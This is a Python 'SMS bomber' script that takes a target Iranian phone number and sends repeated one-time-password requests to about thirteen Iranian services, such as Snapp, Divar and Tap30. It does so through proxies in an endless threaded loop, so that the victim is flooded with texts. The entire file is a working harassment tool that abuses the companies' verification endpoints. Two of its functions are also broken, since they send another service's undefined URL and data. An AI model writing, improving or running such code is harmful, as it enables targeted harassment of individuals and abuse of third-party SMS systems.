#!/usr/bin/env python3

# Libraries
import os
import sys
import time
import requests
from threading import Thread


# Config
config = open("config.py", "r").read()
exec(config)


# Clear
os.system("clear")





# Snapp
def snapp(phone):
    global SnappHeader

    SnappData = {
        "cellphone":phone
        }

    try:
        SnapRequest = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=SnappHeader, json=SnappData, proxies=proxy)
        if "OK" in SnapRequest.text:
            print(f"{green}True:  {white}Snapp{reset}")
        else:
            print(f"{red}False: {white}Snapp{reset}")
    except:
        print(f"{yellow}Can't send request")





# Gap
def gap(phone):
    global GapHeader

    try:
        GapRequest = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=GapHeader, proxies=proxy)
        if "OK" in GapRequest.text:
            print(f"{green}True:  {white}Gap{reset}")
        else:
            print(f"{red}False: {white}Gap{reset}")
    except:
        print(f"{yellow}Can't send request")





# Tap30
def tap30(phone):
    global Tap30Header

    Tap30Data = {
        "credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}
        }

    try:
        Tap30Request = requests.post("https://tap33.me/api/v2/user", headers=Tap30Header, json=Tap30Data, proxies=proxy)
        if "OK" in Tap30Request.text:
            print(f"{green}True:  {white}Tap30{reset}")
        else:
            print(f"{red}False: {white}Tap30{reset}")
    except:
        print(f"{yellow}Can't send request")

# Divar
def divar(phone):
    global DivarHeader
        
    DivarData = {
        "phone":phone.split("+98")[1]
        }

    try:
        DivarRequest = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=DivarHeader, json=DivarData, proxies=proxy)
        if "SENT" in DivarRequest.text:
            print(f"{green}True:  {white}Divar{reset}")
        else:
            print(f"{red}False: {white}Divar{reset}")
    except:
        print(f"{yellow}Can't send request")





# Bama
def bama(phone):
    global BamaHeader

    BamaData = "cellNumber=0"+phone.split("+98")[1]

    try:
        BamaRequest = requests.post("https://bama.ir/signin-send-otp", headers=BamaHeader, data=BamaData, proxies=proxy)
        if "0" in BamaRequest.text:
            print(f"{green}True:  {white}Bama{reset}")
        else:
            print(f"{red}False: {white}Bama{reset}")
    except:
        print(f"{yellow}Can't send request")





#====================# New APIs #===================#

# Dedifood
def dedifood(phone):

    DedifoodURL = "https://customer.didofood.co/api/v1/CustomersRegistrations/send_activation_code"
    DedifoodData =  { 
        "mobile": phone.split("+98")[1],
        "country_id": 1
        }
    try:
        DedifoodRequest = requests.post(DedifoodURL, json=DedifoodData, proxies=proxy)
        if "200" in str(DedifoodRequest):
            print(f"{green}True:  {white}Dedifood{reset}")
        else:
            print(f"{red}False: {white}Dedifood{reset}")
    except:
        print(f"{yellow}Can't send request")





# Behtarino
def behtarino(phone):

    BehtarinoURL = "https://api.behtarino.com/api/v1/businesses/uqqnffxwen/vitrin_verification/"
    BehtarinoData =  { 
        "phone": "0" + phone.split("+98")[1]
        }
    try:
        BehtarinoRequest = requests.post(BehtarinoURL, json=BehtarinoData, proxies=proxy)
        if "200" in str(BehtarinoRequest):
            print(f"{green}True:  {white}Behtarino{reset}")
        else:
            print(f"{red}False: {white}Behtarino{reset}")
    except:
        print(f"{yellow}Can't send request")




# Delino
def delino(phone):

    DelinoURL = "https://www.delino.com/user/register"
    DelinoData =  { 
        "mobile": "0" + phone.split("+98")[1]
        }
    try:
        DelinoRequest = requests.post(DelinoURL, json=DelinoData, proxies=proxy)
        if "200" in str(DelinoRequest):
            print(f"{green}True:  {white}Delino{reset}")
        else:
            print(f"{red}False: {white}Delino{reset}")
    except:
        print(f"{yellow}Can't send request")





# Zarinplus
def zarinplus(phone):

    ZarinplusURL = "https://api.zarinplus.com/user/zarinpal-login"
    ZarinplusData =  { 
        "phone_number": phone.split("+")[1]
        }
    try:
        ZarinplusRequest = requests.post(ZarinplusURL, json=ZarinplusData, proxies=proxy)
        if "200" in str(ZarinplusRequest):
            print(f"{green}True:  {white}Zarinplus{reset}")
        else:
            print(f"{red}False: {white}Zarinplus{reset}")
    except:
        print(f"{yellow}Can't send request")





# Livito
def livito(phone):

    LivitoURL = "https://livito.tv/api/oauth/initialize"
    LivitoData =  { 
        "username": "0" + phone.split("+98")[1],
        "scope": "*",
        "channel": "PASSWORD",
        "grant_type": "password"
        }
    try:
        LivitoRequest = requests.post(LivitoURL, json=LivitoData, proxies=proxy)
        if "200" in str(LivitoRequest):
            print(f"{green}True:  {white}Livito{reset}")
        else:
            print(f"{red}False: {white}Livito{reset}")
    except:
        print(f"{yellow}Can't send request")





# Baarbaanet
def baarbaanet(phone):

    BaarbaanetURL = "https://baarbaanet.com/Barbanet/rest/pub/user/otp/send"
    BaarbaanetData =  { 
        "mobile": "0" + phone.split("+98")[1],
        "viaSms": True,
        "viaEmail": False
        }
    try:
        BaarbaanetRequest = requests.post(BaarbaanetURL, json=BaarbaanetData, proxies=proxy)
        if "200" in str(BaarbaanetRequest):
            print(f"{green}True:  {white}Baarbaanet{reset}")
        else:
            print(f"{red}False: {white}Baarbaanet{reset}")
    except:
        print(f"{yellow}Can't send request")





# Bornos
def bornosmode(phone):

    BornosURL = "https://bornosmode.com/api/loginRegister/"
    BornosData =  { 
        "mobile": "0" + phone.split("+98")[1],
        "withOtp": 1

        }
    try:
        BornosRequest = requests.post(BaarbaanetURL, json=BaarbaanetData, proxies=proxy)
        if "200" in str(BornosRequest):
            print(f"{green}True:  {white}Bornos{reset}")
        else:
            print(f"{red}False: {white}Bornos{reset}")
    except:
        print(f"{yellow}Can't send request")




# Komodaa
def komodaa(phone):

    KomodaaURL = "https://api.komodaa.com/api/v2.6/loginRC/request"
    KomodaaData =  { 
        "phone_number": "0" + phone.split("+98")[1]
        }
    try:
        KomodaaRequest = requests.post(BaarbaanetURL, json=BaarbaanetData, proxies=proxy)
        if "200" in str(KomodaaRequest):
            print(f"{green}True:  {white}Komodaa{reset}")
        else:
            print(f"{red}False: {white}Komodaa{reset}")
    except:
        print(f"{yellow}Can't send request")





# Main
def main():
    global logo

    print(logo)
    text = f"{cyan}Enter target (+98xxxxxxxxxx) : {reset}" 
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.05)

    phone = input()

    if len(phone) == 13:    
        print (f"{purple}Spam Started!{reset}\n")

        while True:
            Thread(target=snapp, args=[phone]).start()         # Snapp
            time.sleep(0.5)
            Thread(target=gap, args=[phone]).start()           # Gap
            time.sleep(0.5)
            Thread(target=tap30, args=[phone]).start()         # Tap30
            time.sleep(0.5)
            Thread(target=divar, args=[phone]).start()         # Divar
            time.sleep(0.5)
            Thread(target=bama, args=[phone]).start()          # Bama
            time.sleep(0.5)

        #=====# New APIs #=====#
        
            Thread(target=dedifood, args=[phone]).start()      # Dedifood
            time.sleep(0.5) 
            Thread(target=behtarino, args=[phone]).start()     # Behtarino
            time.sleep(0.5)
            Thread(target=delino, args=[phone]).start()        # Delino
            time.sleep(0.5)
            Thread(target=zarinplus, args=[phone]).start()     # Zarinplus
            time.sleep(0.5)
            Thread(target=livito, args=[phone]).start()        # Livito
            time.sleep(0.5)
            Thread(target=baarbaanet, args=[phone]).start()    # Baarbaanet
            time.sleep(0.5)
            Thread(target=bornosmode, args=[phone]).start()    # Bornos
            time.sleep(0.5)
            Thread(target=komodaa, args=[phone]).start()       # Komodaa
            time.sleep(0.5) 

    else:
        error = f"{white}Error: {red}Invalid number entered!"
        for char in error:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.05)       





if __name__ == "__main__":
    main()

# SlavPH
